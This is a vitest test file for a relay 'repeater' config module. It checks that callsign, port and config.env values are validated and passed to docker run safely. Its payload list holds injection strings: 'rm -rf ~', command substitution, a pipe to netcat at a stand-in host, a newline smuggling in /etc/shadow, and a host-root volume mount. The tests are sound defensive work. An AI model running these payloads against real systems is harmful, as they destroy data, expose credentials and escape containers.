import { describe, expect, it } from "vitest";
import {
  buildDockerRunArgs,
  formatEnvFile,
  parseEnvFile,
  RepeaterConfigError,
  resolveStartConfig,
  validateCallsign,
  validatePort,
} from "./repeaterConfig";

const SHELL_PAYLOADS = [
  "X; touch /tmp/pwned",
  "X && rm -rf ~",
  "X`id`",
  "X$(id)",
  "X | nc evil 1",
  "X\nECHOLET_TLS_KEY_FILE=/etc/shadow",
  "-v /:/host",
  "X Y",
  "",
];

describe("repeater callsign and port validation", () => {
  it("accepts ordinary callsigns", () => {
    expect(validateCallsign("REPEATER-01")).toBe("REPEATER-01");
    expect(validateCallsign("  node_7 ")).toBe("node_7");
  });

  it.each(SHELL_PAYLOADS)("refuses a callsign that is not a plain token: %j", (payload) => {
    expect(() => validateCallsign(payload)).toThrow(RepeaterConfigError);
  });

  it("refuses an overlong callsign", () => {
    expect(() => validateCallsign("A".repeat(33))).toThrow(RepeaterConfigError);
  });

  it("accepts ports in range and refuses everything else", () => {
    expect(validatePort("8081")).toBe(8081);
    expect(validatePort(65535)).toBe(65535);
    for (const bad of ["0", "65536", "-1", "80a", "8081; id", "1e3", " ", "80\n81"]) {
      expect(() => validatePort(bad), bad).toThrow(RepeaterConfigError);
    }
  });
});

describe("repeater config.env", () => {
  it("round-trips through format and parse", () => {
    const raw = formatEnvFile([["ECHOLET_NODE_CALLSIGN", "REPEATER-01"], ["ECHOLET_PORT", "8081"]]);
    expect(parseEnvFile(raw)).toEqual({ ECHOLET_NODE_CALLSIGN: "REPEATER-01", ECHOLET_PORT: "8081" });
  });

  it("refuses a value whose newline would start a second variable", () => {
    expect(() => formatEnvFile([["ECHOLET_TLS_CERT_FILE", "/a.crt\nECHOLET_DATA_DIR=/"]])).toThrow(RepeaterConfigError);
  });

  it("refuses to start from a tampered config.env", () => {
    expect(() => resolveStartConfig({ ECHOLET_NODE_CALLSIGN: "X; touch /tmp/pwned" })).toThrow(RepeaterConfigError);
    expect(() => resolveStartConfig({ ECHOLET_PORT: "8081 -v /:/host" })).toThrow(RepeaterConfigError);
  });

  it("falls back to defaults when config.env is absent", () => {
    expect(resolveStartConfig({})).toEqual({ callsign: "LOCAL-REPEATER", port: 8081 });
  });
});

describe("repeater docker run argv", () => {
  it("passes each value as exactly one argument, bound to loopback", () => {
    const args = buildDockerRunArgs({ callsign: "REPEATER-01", port: 9000 }, "/home/op/.echolet/repeater/data");

    expect(args[0]).toBe("run");
    expect(args).toContain("127.0.0.1:9000:8443");
    expect(args).toContain("ECHOLET_NODE_CALLSIGN=REPEATER-01");
    expect(args[args.indexOf("-v") + 1]).toBe("/home/op/.echolet/repeater/data:/var/lib/echolet");
    expect(args.at(-1)).toBe("echolet-relay:latest");
  });

  it("keeps a data directory with spaces in a single argument", () => {
    const args = buildDockerRunArgs({ callsign: "R", port: 8081 }, "/Users/Jane Doe/.echolet/repeater/data");
    expect(args).toContain("/Users/Jane Doe/.echolet/repeater/data:/var/lib/echolet");
  });
});
